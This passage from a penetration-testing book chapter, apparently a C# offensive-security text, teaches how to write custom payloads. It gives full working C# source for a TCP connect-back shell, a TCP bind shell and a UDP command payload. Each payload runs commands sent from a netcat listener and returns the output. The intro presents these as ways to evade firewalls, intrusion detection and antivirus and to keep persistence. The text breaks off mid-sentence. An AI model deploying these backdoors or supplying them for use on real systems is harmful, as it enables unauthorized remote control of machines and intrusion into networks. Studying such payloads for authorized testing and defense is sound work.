<html><head></head><body>
<p id="filepos344540" class="calibre_"><span class="calibre6"><span class="bold">
</span></span><span class="calibre1"><span class="bold">4</span></span><br class="calibre5"/><span class="calibre6"><span class="bold">WRITING CONNECT-BACK, BINDING, AND METASPLOIT PAYLOADS</span></span></p><p class="calibre_12"><img src="images/00010.jpg" class="calibre_13"/></p><p class="calibre_6">As a penetration tester or a security engineer, it’s really useful to be able to write and customize payloads on the fly. Often, corporate environments will differ drastically from one to the next, and “off-the-shelf” payloads by frameworks such as Metasploit are simply blocked by intrusion detection/prevention systems, network access controls, or other variables of the network. However, Windows machines on corporate networks almost always have the .NET framework installed, which makes C# a great language to write payloads in. The core libraries available to C# also have excellent networking classes that allow you to hit the ground running in any environment.</p><p class="calibre_6">The best penetration testers know how to build custom payloads, tailored for particular environments, in order to stay under the radar longer, maintain persistence, or bypass an intrusion detection system or firewall. This chapter shows you how to write an assortment of payloads for use over TCP (Transmission Control Protocol) and UDP (User Datagram Protocol). We’ll create a cross-platform UDP connect-back payload to bypass weak firewall rules and discuss how to run arbitrary Metasploit assembly payloads to aid in antivirus evasion.</p><p id="filepos346165" class="calibre_10"><span class="calibre3"><span class="bold">Creating a Connect-Back Payload</span></span></p><p class="calibre_11">The first kind of payload we’ll write is a <span class="italic">connect-back</span>, which allows an attacker to listen for a connection back from the target. This type of payload is useful if you don’t have direct access to the machine that the payload is being run on. For example, if you are outside the network performing a phishing campaign with Metasploit Pro, this type of payload allows the targets to reach outside the network to connect with you. The alternative, which we’ll discuss shortly, is for the payload to listen for a connection from the attacker on the target’s machine. Binding payloads like these are most useful for maintaining persistence when you can get network access.</p><p id="filepos347001" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">The Network Stream</span></span></span></p><p class="calibre_11">We’ll use the <span class="calibre4">netcat</span> utility available on most Unix-like operating systems to test our bind and connect-back payloads. Most Unix operating systems come with <span class="calibre4">netcat</span> preinstalled, but if you want to use it on Windows, you must download the utility with Cygwin or as an independent binary (or build from source!). First, set up <span class="calibre4">netcat</span> to listen for the connection back from our target, as shown in <a href="#filepos347775">Listing 4-1</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">nc -l 4444</span></span></blockquote><p id="filepos347775" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-1: Listening on port 4444 using netcat</span></span></p><p class="calibre_6">Our connect-back payload needs to create a network stream to read from and write to. As you can see in <a href="#filepos348756">Listing 4-2</a>, the first lines of the payload’s <span class="calibre4">Main()</span> method create this stream for later use based on arguments passed to the payload.</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> using (TcpClient client = new ➊TcpClient(args[0], ➋int.Parse(args[1])))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (Stream stream = client.➌GetStream())</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (StreamReader rdr = new ➍StreamReader(stream))</span><br class="calibre5"/><span class="calibre4"> {</span></blockquote><p id="filepos348756" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-2: Creating the stream back to the attacker using payload arguments</span></span></p><p class="calibre_6">The <span class="calibre4">TcpClient</span> class constructor takes two arguments: the host to connect to as a string and the port to connect to on the host as an int. Using the arguments passed to the payload, and assuming the first argument is the host to connect to, we pass the arguments to the <span class="calibre4">TcpClient</span> constructor ➊. Since by default the arguments are strings, we don’t need to cast the host to any special type, only the port.</p><p class="calibre_6">The second argument, which specifies the port to connect to, must be given as an int. In order to achieve this, we use the <span class="calibre4">int.Parse()</span> static method ➋ to convert the second argument from a string to an int. (Many types in C# have a static <span class="calibre4">Parse()</span> method that converts one type to another.) After instantiating the <span class="calibre4">TcpClient</span>, we call the client’s <span class="calibre4">GetStream()</span> method ➌ and assign it to the variable <span class="calibre4">stream</span>, which we’ll read from and write to. Finally, we pass the stream to a <span class="calibre4">StreamReader</span> class constructor ➍ so that we can easily read the commands coming from the attacker.</p><p class="calibre_6">Next, we need the payload to read from the stream as long as we are sending commands from our <span class="calibre4">netcat</span> listener. For this we’ll use the stream created in <a href="#filepos348756">Listing 4-2</a>, as shown in <a href="#filepos351334">Listing 4-3</a>.</p><blockquote class="calibre_14"><span class="calibre4"> while (true)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string cmd = rdr.➊ReadLine();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrEmpty(cmd))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> rdr.➋Close();</span><br class="calibre5"/><span class="calibre4"> stream.Close();</span><br class="calibre5"/><span class="calibre4"> client.Close();</span><br class="calibre5"/><span class="calibre4"> return;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.➌IsNullOrWhiteSpace(cmd))</span><br class="calibre5"/><span class="calibre4"> continue;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string[] split = cmd.Trim().➍Split(' ');</span><br class="calibre5"/><span class="calibre4"> string filename = split.➎First();</span><br class="calibre5"/><span class="calibre4"> string arg = string.➏Join(" ", split.➐Skip(1)); </span><a id="filepos351334"/><span class="calibre4"><span class="italic">Listing 4-3: Reading the command from the stream and parsing the command from the command arguments</span></span></blockquote><p class="calibre_6">Within an infinite <span class="calibre4">while</span> loop, the <span class="calibre4">StreamReader ReadLine()</span> method ➊ reads a line of data from the stream, which is then assigned to the <span class="calibre4">cmd</span> variable. We determine what a line of data is based on where a newline character appears in the data stream (<span class="calibre4">\n</span>, or <span class="calibre4">0x0a</span> in hexadecimal). If the string returned by <span class="calibre4">ReadLine()</span> is empty or null, we close ➋ the stream reader, the stream, and the client, and then return from the program. If the string contains only whitespace ➌, we start the loop over using <span class="calibre4">continue</span>, which brings us back to the <span class="calibre4">ReadLine()</span> method to start over.</p><p class="calibre_6">After reading the command to be run from the network stream, we separate the arguments to the command from the command itself. For example, if an attacker sends the command <span class="calibre4">ls -a</span>, the command is <span class="calibre4">ls</span>, and the argument to the command is <span class="calibre4">-a</span>.</p><p class="calibre_6"> To separate out the arguments, we use the <span class="calibre4">Split()</span> method ➍ to split the full command on every space in the string and then return an array of strings. The string array is a result of splitting the whole command string by the delimiter passed as the argument to the <span class="calibre4">Split()</span> method, which in our case is a space. Next, we use the <span class="calibre4">First()</span> method ➎, which is available in the <span class="calibre4">System.Linq</span> namespace for enumerable types such as arrays, to select the first element in the string array returned by the split, and we assign it to the string <span class="calibre4">filename</span> to hold our base command. This should be the actual command name. Then, the <span class="calibre4">Join()</span> method ➏ joins all but the first string in the split array with a space as the joining character. We also use the LINQ method <span class="calibre4">Skip()</span> ➐ to skip the first element in the array that was stored in the filename variable. The resulting string should contain all arguments passed to the command. This new string is assigned to the string <span class="calibre4">arg</span>.</p><p id="filepos353822" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Running the Command</span></span></span></p><p class="calibre_11">Now we need to run the command and return the output to the attacker. As shown in <a href="#filepos355535">Listing 4-4</a>, we use the <span class="calibre4">Process</span> and <span class="calibre4">ProcessStartInfo</span> classes to set up and run the command and then write the output back to the attacker.</p><blockquote class="calibre_14"><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Process prc = new ➊Process();</span><br class="calibre5"/><span class="calibre4"> prc.➋StartInfo = new ProcessStartInfo();</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.➌FileName = filename;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.➍Arguments = arg;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.➎UseShellExecute = false;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.➏RedirectStandardOutput = true;</span><br class="calibre5"/><span class="calibre4"> prc.➐Start();</span><br class="calibre5"/><span class="calibre4"> prc.StandardOutput.BaseStream.➑CopyTo(stream);</span><br class="calibre5"/><span class="calibre4"> prc.WaitForExit();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> catch</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string error = "Error running command " + cmd + "\n";</span><br class="calibre5"/><span class="calibre4"> byte[] errorBytes = ➒Encoding.ASCII.GetBytes(error);</span><br class="calibre5"/><span class="calibre4"> stream.➓Write(errorBytes, 0, errorBytes.Length);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos355535" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-4: Running the attacker-supplied command to the connect-back payload and returning the output</span></span></p><p class="calibre_6">After instantiating a new <span class="calibre4">Process</span> class ➊, we assign a new <span class="calibre4">ProcessStartInfo</span> class to the <span class="calibre4">StartInfo</span> property ➋ of the <span class="calibre4">Process</span> class, which allows us to define certain options for the command so that we can get the output. Having assigned the <span class="calibre4">StartInfo</span> property with a new <span class="calibre4">ProcessStartInfo</span> class, we then assign values to the <span class="calibre4">StartInfo</span> properties: the <span class="calibre4">FileName</span> property ➌, which is the command we want to run, and the <span class="calibre4">Arguments</span> property ➍, which contains any arguments for the command.</p><p class="calibre_6">We also assign the <span class="calibre4">UseShellExecute</span> property ➎ to <span class="calibre4">false</span> and the <span class="calibre4">RedirectStandardOutput</span> property ➏ to <span class="calibre4">true</span>. If <span class="calibre4">UseShellExecute</span> were set to <span class="calibre4">true</span>, the command would be run in the context of another system shell, rather than directly by the current executable. With <span class="calibre4">RedirectStandardOutput</span> set to <span class="calibre4">true</span>, we can use the <span class="calibre4">StandardOutput</span> property of the <span class="calibre4">Process</span> class to read the command output.</p><p class="calibre_6">Once the <span class="calibre4">StartInfo</span> property is set, we call <span class="calibre4">Start()</span> ➐ on the <span class="calibre4">Process</span> to begin execution of the command. While the process is running, we copy its standard output directly to the network stream to send to the attacker using <span class="calibre4">CopyTo()</span> ➑ on the <span class="calibre4">StandardOutput</span> stream’s <span class="calibre4">BaseStream</span> property. If an error occurs during execution, <span class="calibre4">Encoding.ASCII.GetBytes()</span> ➒ converts the string <span class="calibre4">Error running command &lt;cmd&gt;</span> to a byte array, which is then written to the network stream for the attacker using the stream’s <span class="calibre4">Write()</span> method ➓.</p><p id="filepos357882" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Running the Payload</span></span></span></p><p class="calibre_11">Running the payload with <span class="calibre4">127.0.0.1</span> and <span class="calibre4">4444</span> as the arguments should connect back to our <span class="calibre4">netcat</span> listener so that we can run commands on the local machine and display them in the terminal, as shown in <a href="#filepos358607">Listing 4-5</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">nc -l 4444</span></span><br class="calibre5"/><span class="calibre4"><span class="bold">whoami</span></span><br class="calibre5"/><span class="calibre4">bperry</span><br class="calibre5"/><span class="calibre4"><span class="bold">uname</span></span><br class="calibre5"/><span class="calibre4">Linux </span><a id="filepos358607"/><span class="calibre4"><span class="italic">Listing 4-5: Connect-back payload connecting to the local listener and running commands</span></span></blockquote><p id="filepos358743" class="calibre_10"><span class="calibre3"><span class="bold">Binding a Payload</span></span></p><p class="calibre_11">When you’re on a network with direct access to the machines that could be running your payloads, you’ll sometimes want the payloads to wait for you to connect to them, rather than you waiting for a connection from them.</p><p class="calibre_6">In such cases, the payloads should bind locally to a port that you can simply connect to with <span class="calibre4">netcat</span> so you can begin interacting with the system’s shell.</p><p class="calibre_6">In the connect-back payload, we used the <span class="calibre4">TcpClient</span> class to create a connection to the attacker. Here, instead of using the <span class="calibre4">TcpClient</span> class, we’ll use the <span class="calibre4">TcpListener</span> class to listen for a connection from the attacker, as shown in <a href="#filepos360328">Listing 4-6</a>.</p><blockquote class="calibre_14"><span class="calibre4"> public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> int port = ➊int.Parse(args[0]);</span><br class="calibre5"/><span class="calibre4"> TcpListener listener = new ➋TcpListener(IPAddress.Any, port);</span><br class="calibre5"/><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> listener.➌Start();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> catch</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> return;</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos360328" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-6: Starting a</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">TcpListener</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">on a given port via command arguments</span></span></p><p class="calibre_6">Before we start listening, we convert the argument passed to the payload to an integer using <span class="calibre4">int.Parse()</span> ➊, which will be the port to listen on. Then we instantiate a new <span class="calibre4">TcpListener</span> class ➋ by passing <span class="calibre4">IPAddress.Any</span> as the first argument to the constructor and the port we want to listen on as the second argument. The <span class="calibre4">IPAddress.Any</span> value passed as the first argument tells the <span class="calibre4">TcpListener</span> to listen on any available interface (0.0.0.0).</p><p class="calibre_6">Next, we attempt to begin listening on the port in a <span class="calibre4">try</span>/<span class="calibre4">catch</span> block. We do so because calling <span class="calibre4">Start()</span> ➌ could throw an exception if, for example, the payload is not running as a privileged user and it attempts to bind to a port number less than 1024, or if it attempts to bind to a port already bound to by another program. By running <span class="calibre4">Start()</span> in a <span class="calibre4">try</span>/<span class="calibre4">catch</span> block, we can catch this exception and exit gracefully if necessary. Of course, if <span class="calibre4">Start()</span> succeeds, the payload will begin listening for a new connection on that port.</p><p id="filepos361907" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Accepting Data, Running Commands, and Returning Output</span></span></span></p><p class="calibre_11">Now we can begin accepting data from the attacker and parsing the commands, as shown in <a href="#filepos363520">Listing 4-7</a>.</p><blockquote class="calibre_14"><span class="calibre4"> ➊while (true)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (Socket socket = ➋listener.AcceptSocket())</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (NetworkStream stream = new ➌NetworkStream(socket))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (StreamReader rdr = new ➍StreamReader(stream))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> ➎while (true)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string cmd = rdr.ReadLine();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrEmpty(cmd))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> rdr.Close();</span><br class="calibre5"/><span class="calibre4"> stream.Close();</span><br class="calibre5"/><span class="calibre4"> listener.Stop();</span><br class="calibre5"/><span class="calibre4"> break;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrWhiteSpace(cmd))</span><br class="calibre5"/><span class="calibre4"> continue;</span><br class="calibre5"/><span class="calibre4">
</span><br class="calibre5"/><span class="calibre4"> string[] split = cmd.Trim().➏Split(' ');</span><br class="calibre5"/><span class="calibre4"> string filename = split.➐First();</span><br class="calibre5"/><span class="calibre4"> string arg = string.➑Join(" ", split.Skip(1)); </span><a id="filepos363520"/><span class="calibre4"><span class="italic">Listing 4-7: Reading the command from the network stream and splitting the command from the arguments</span></span></blockquote><p class="calibre_6">In order to maintain persistence on the target after we disconnect from the payload, we instantiate a new <span class="calibre4">NetworkStream</span> class inside a technically infinite <span class="calibre4">while</span> loop ➊ by passing the <span class="calibre4">Socket</span> returned by <span class="calibre4">listener.AcceptSocket()</span> ➋ to the <span class="calibre4">NetworkStream</span> constructor ➌. Then, in order to read the <span class="calibre4">NetworkStream</span> efficiently, within the context of a <span class="calibre4">using</span> statement, we instantiate a new <span class="calibre4">StreamReader</span> class ➍ by passing the network stream to the <span class="calibre4">StreamReader</span> constructor. Once we have the <span class="calibre4">StreamReader</span> set up, we use a second infinite <span class="calibre4">while</span> loop ➎ to continue reading commands until an empty line is sent to the payload by the attacker.</p><p class="calibre_6">To parse and execute commands from the stream and return the output to the connecting attacker, we declare a series of string variables within the inner <span class="calibre4">while</span> loop and split the original input on any spaces in the string ➏. Next, we take the first element from the split and assign it as the command to be run, using LINQ to select the first element in the array ➐. We then use LINQ again to join all the strings in the split array <span class="italic">after</span> the first element ➑ and assign the resulting string (with the argument separated by spaces) to the <span class="calibre4">arg</span> variable.</p><p id="filepos365254" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Executing Commands from the Stream</span></span></span></p><p class="calibre_11">Now we can set up our <span class="calibre4">Process</span> and <span class="calibre4">ProcessStartInfo</span> classes to run the command with the arguments, if any, and capture the output, as shown in <a href="#filepos367006">Listing 4-8</a>.</p><blockquote class="calibre_14"><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Process prc = new ➊Process();</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo = new ProcessStartInfo();</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.➋FileName = filename;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.➌Arguments = arg;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.UseShellExecute = false;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.RedirectStandardOutput = true;</span><br class="calibre5"/><span class="calibre4"> prc.➍Start();</span><br class="calibre5"/><span class="calibre4"> prc.StandardOutput.BaseStream.➎CopyTo(stream);</span><br class="calibre5"/><span class="calibre4"> prc.WaitForExit();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> catch</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string error = "Error running command " + cmd + "\n";</span><br class="calibre5"/><span class="calibre4"> byte[] errorBytes = ➏Encoding.ASCII.GetBytes(error);</span><br class="calibre5"/><span class="calibre4"> stream.➐Write(errorBytes, 0, errorBytes.Length);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos367006" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-8: Running the command, capturing the output, and sending it back to the attacker</span></span></p><p class="calibre_6">As with the connect-back payload discussed in the previous section, in order to run the command, we instantiate a new <span class="calibre4">Process</span> class ➊ and assign a new <span class="calibre4">ProcessStartInfo</span> class to the <span class="calibre4">Process</span> class’s <span class="calibre4">StartInfo</span> property. We set the command filename to the <span class="calibre4">FileName</span> property ➋ in <span class="calibre4">StartInfo</span> and set the <span class="calibre4">Arguments</span> property ➌ with the arguments to the command. We then set the <span class="calibre4">UseShellExecute</span> property to <span class="calibre4">false</span> so that our executable starts the command directly, and we set the <span class="calibre4">RedirectStandardOutput</span> property to <span class="calibre4">true</span> so we can capture the command output and return it to the attacker.</p><p class="calibre_6">To start the command, we call the <span class="calibre4">Process</span> class’s <span class="calibre4">Start()</span> method ➍. While the process is running, we copy the standard output stream directly to the network stream sent to the attacker by passing it in as an argument to <span class="calibre4">CopyTo()</span> ➎, and then we wait for the process to exit. If an error occurs, we convert the string <span class="calibre4">Error running command &lt;cmd&gt;</span> to an array of bytes using <span class="calibre4">Encoding.ASCII.GetBytes()</span> ➏. The byte array is then written to the network stream and sent to the attacker using the stream’s <span class="calibre4">Write()</span> method ➐.</p><p class="calibre_6">Running the payload with <span class="calibre4">4444</span> as the argument will make the listener start listening on port 4444 on all available interfaces. We can now use <span class="calibre4">netcat</span> to connect to the listening port, as shown in <a href="#filepos369421">Listing 4-9</a>, and begin executing commands and returning their output.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">nc 127.0.0.1 4444</span></span><br class="calibre5"/><span class="calibre4"><span class="bold">whoami</span></span><br class="calibre5"/><span class="calibre4">bperry</span><br class="calibre5"/><span class="calibre4"><span class="bold">uname</span></span><br class="calibre5"/><span class="calibre4">Linux </span><a id="filepos369421"/><span class="calibre4"><span class="italic">Listing 4-9: Connecting to the binding payload and executing commands</span></span></blockquote><p id="filepos369539" class="calibre_10"><span class="calibre3"><span class="bold">Using UDP to Attack a Network</span></span></p><p class="calibre_11">The payloads discussed so far have used TCP to communicate; TCP is a <span class="italic">stateful</span> protocol that allows two computers to maintain a connection with each other over time. An alternative protocol is UDP, which, unlike TCP, is <span class="italic">stateless</span>: no connection is maintained between two networked machines when communicating. Instead, communication is performed via broadcasts across the network, with each computer listening for broadcasts to its IP address.</p><p class="calibre_6">Another very important distinction between UDP and TCP is that TCP attempts to ensure that packets sent to a machine will reach that machine in the same order in which they were sent. In contrast, UDP packets may be received in any order, or not at all, which makes UDP less reliable than TCP.</p><p class="calibre_6"> UDP does, however, have some benefits. For one, because it doesn’t try to ensure that computers receive the packets it sends, it’s blazingly fast. It’s also not as commonly scrutinized on networks as TCP is, with some firewalls configured to handle TCP traffic only. This makes UDP is a great protocol to use when attacking a network, so let’s see how to write a UDP payload to execute a command on a remote machine and return the results.</p><p class="calibre_6">Instead of using the <span class="calibre4">TcpClient</span> or <span class="calibre4">TcpListener</span> classes to achieve a connection and communicate, as in previous payloads, we’ll use the <span class="calibre4">UdpClient</span> and <span class="calibre4">Socket</span> classes over UDP. Both the attacker and target machines will need to listen for UDP broadcasts as well as maintain a socket to broadcast data to the other computer.</p><p id="filepos371440" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">The Code for the Target’s Machine</span></span></span></p><p class="calibre_11">The code to run on the target machine will listen on a UDP port for commands, execute those commands, and return the output to the attacker via a UDP socket, as shown in <a href="#filepos372322">Listing 4-10</a>.</p><blockquote class="calibre_14"><span class="calibre4"> public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> int lport = int.➊Parse(args[0]);</span><br class="calibre5"/><span class="calibre4"> using (UdpClient listener = new ➋UdpClient(lport))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);</span><br class="calibre5"/><span class="calibre4"> string cmd;</span><br class="calibre5"/><span class="calibre4"> byte[] input; </span><a id="filepos372322"/><span class="calibre4"><span class="italic">Listing 4-10: First five lines of the</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method for the target code</span></span></blockquote><p class="calibre_6">Before sending and receiving data, we set up a variable for the port to listen on. (To keep things simple, we’ll have both the target and attacker machines listen for data on the same port, but this assumes we are attacking a separate virtual machine). As shown in <a href="#filepos372322">Listing 4-10</a>, we use <span class="calibre4">Parse()</span> ➊ to turn the string passed as an argument into an integer, and then we pass the port to the <span class="calibre4">UdpClient</span> constructor ➋ to instantiate a new <span class="calibre4">UdpClient</span>. We also to set up the <span class="calibre4">IPEndPoint</span> class ➌, which encompasses a network interface and a port, by passing in <span class="calibre4">IPAddress.Any</span> as the first argument and the port to listen on as the second argument. We assign the new object to the <span class="calibre4">localEP</span> (local endpoint) variable. Now we can begin receiving data from network broadcasts.</p><p class="calibre_10"><span class="calibre3"><span class="bold">The Main while Loop</span></span></p><p class="calibre_11">As shown in <a href="#filepos374741">Listing 4-11</a>, we begin with a <span class="calibre4">while</span> loop that loops continuously until an empty string is received from the attacker.</p><blockquote class="calibre_14"><span class="calibre4"> while (true)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> input = listener.➊Receive(ref localEP);</span><br class="calibre5"/><span class="calibre4"> cmd = ➋Encoding.ASCII.GetString(input, 0, input.Length);</span><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrEmpty(cmd))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> listener.Close();</span><br class="calibre5"/><span class="calibre4"> return;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (string.IsNullOrWhiteSpace(cmd))</span><br class="calibre5"/><span class="calibre4"> continue;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string[] split = cmd.Trim().➌Split(' ');</span><br class="calibre5"/><span class="calibre4"> string filename = split.➍First();</span><br class="calibre5"/><span class="calibre4"> string arg = string.➎Join(" ", split.Skip(1));</span><br class="calibre5"/><span class="calibre4"> string results = string.Empty; </span><a id="filepos374741"/><span class="calibre4"><span class="italic">Listing 4-11: Listening for UDP broadcasts with commands and parsing the command from the arguments</span></span></blockquote><p class="calibre_6">In this <span class="calibre4">while</span> loop, we call <span class="calibre4">listener.Receive()</span>, passing in the <span class="calibre4">IPEndPoint</span> class we instantiated. Receiving data from the attacker, <span class="calibre4">Receive()</span> ➊ fills the <span class="calibre4">localEP Address</span> property with the attacking host’s IP address and other connection information, so we can use this data later when responding. <span class="calibre4">Receive()</span> also blocks execution of the payload until a UDP broadcast is received.</p><p class="calibre_6">Once a broadcast is received, <span class="calibre4">Encoding.ASCII.GetString()</span> ➋ converts the data to an ASCII string. If the string is null or empty, we break from the <span class="calibre4">while</span> loop and let the payload process finish and exit. If the string consists only of whitespace, we restart the loop using <span class="calibre4">continue</span> to receive a new command from the attacker. Once we’ve ensured that the command isn’t an empty string or whitespace, we split it on any spaces ➌ (same as we did in the TCP payloads) and then separate the command from the string array returned by the split ➍. We then create the argument string by joining all the strings in the split array after the first array element ➎.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Executing the Command and Returning the Result to the Sender</span></span></p><p class="calibre_11">Now we can execute the command and return the result to the sender via a UDP broadcast, as shown in <a href="#filepos378195">Listing 4-12</a>.</p><blockquote class="calibre_14"><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Process prc = new Process();</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo = new ProcessStartInfo();</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.FileName = filename;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.Arguments = arg;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.UseShellExecute = false;</span><br class="calibre5"/><span class="calibre4"> prc.StartInfo.RedirectStandardOutput = true;</span><br class="calibre5"/><span class="calibre4"> prc.Start();</span><br class="calibre5"/><span class="calibre4"> prc.WaitForExit();</span><br class="calibre5"/><span class="calibre4"> results = prc.StandardOutput.➊ReadToEnd();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> catch</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> results = "There was an error running the command: " + filename;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> using (Socket sock = new ➋Socket(AddressFamily.InterNetwork,</span><br class="calibre5"/><span class="calibre4"> SocketType.Dgram, ProtocolType.Udp))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> IPAddress sender = ➌localEP.Address;</span><br class="calibre5"/><span class="calibre4"> IPEndPoint remoteEP = new ➍IPEndPoint(sender, lport);</span><br class="calibre5"/><span class="calibre4"> byte[] resultsBytes = Encoding.ASCII.GetBytes(results);</span><br class="calibre5"/><span class="calibre4"> sock.➎SendTo(resultsBytes, remoteEP);</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos378195" class="calibre_15"><span class="calibre4"><span class="italic">Listing 4-12: Executing the command received and broadcasting the output back to the attacker</span></span></p><p class="calibre_6">As with the previous payloads, we use the <span class="calibre4">Process</span> and <span class="calibre4">ProcessStartInfo</span> classes to execute the command and return the output. We set up the <span class="calibre4">StartInfo</span> property with the <span class="calibre4">filename</span> and <span class="calibre4">arg</span> variables we used to store the command and command arguments, respectively, and we also set the <span class="calibre4">UseShellExecute</span> property and the <span class="calibre4">RedirectStandardOutput</span> property. We begin the new process by calling the <span class="calibre4">Start()</span> method and then wait until the process has finished execution by calling <span class="calibre4">WaitForExit()</span>. Once the command finishes, we call the <span class="calibre4">ReadToEnd()</span> method ➊ on the <span class="calibre4">StandardOutput</span> stream property of the process and save the output to the <span class="calibre4">results</span> string declared earlier. If an error occurred during process execution, we instead assign the string <span class="calibre4">There was an error running the command: &lt;cmd&gt;</span> to the <span class="calibre4">results</span> variable.</p><p class="calibre_6">Now we need to set up the socket that will be used to return the command output to the sender. We’ll broadcast the data using a UDP socket. Using the <span class="calibre4">Socket</span> class, we instantiate a new <span class="calibre4">Socket</span> ➋ by passing enumeration values as the arguments to the <span class="calibre4">Socket</span> constructor. The first value, <span class="calibre4">AddressFamily.InterNetwork</span>, says we’ll be communicating using IPv4 addresses. The second value, <span class="calibre4">SocketType.Dgram</span>, means that we’ll be communicating using UDP datagrams (the <span 